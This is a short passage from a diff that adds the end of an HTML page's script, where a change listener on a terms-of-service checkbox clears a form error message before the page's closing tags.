+});
+document.getElementById("tos-check").addEventListener("change",function(){
+  showErr("err-tos",false);
+});
+</script>
+</body>
+</html>
